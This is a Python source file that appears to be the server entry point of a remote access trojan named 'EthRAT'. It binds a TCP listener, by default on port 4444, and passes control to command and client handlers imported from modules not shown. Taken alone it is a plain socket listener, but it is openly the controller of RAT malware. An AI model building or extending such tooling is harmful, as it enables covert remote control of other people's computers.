from src.ui.colors import Colors as cl
from src.ui.art import banner
from src.utils.client_handler import handle_client
from src.utils.command_handler import main_loop
from datetime import datetime
import argparse
import socket

  
def parse_args():
    parser = argparse.ArgumentParser(description="EthRAT Server")
    parser.add_argument("-lhost", "--host", default="0.0.0.0", help="IP to bind the server (default: 0.0.0.0)")
    parser.add_argument("-lport", "--port", type=int, default=4444, help="Port to listen on (default: 4444)")
    return parser.parse_args()

def server():
    try:
        args = parse_args()
        if not (1 <= args.port <= 65535):
            raise Exception("Port must be 1-65535")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((args.host, args.port))
        sock.listen()
        
        banner()
        print(f"{cl.cyan }[*] Listening on {args.host}:{args.port}{cl.reset} {cl.light_green}@ {datetime.now().strftime("%H:%M:%S")}{cl.reset}")
        print(f"{cl.teal}[*] Type 'help' for commands or 'exit' to shutdown.{cl.reset}\n")

        main_loop()
        handle_client(sock)
        

    except (KeyboardInterrupt):
        print(f"{cl.yellow} [*] Interrupted by user, shutting down the server...")
        sock.close()
        exit()
    except (Exception, socket.error, OSError) as e:
        print(f"{cl.red}[!] Error: {e}{cl.reset}")
        sock.close()
        exit()
 

if __name__ == "__main__":
    server()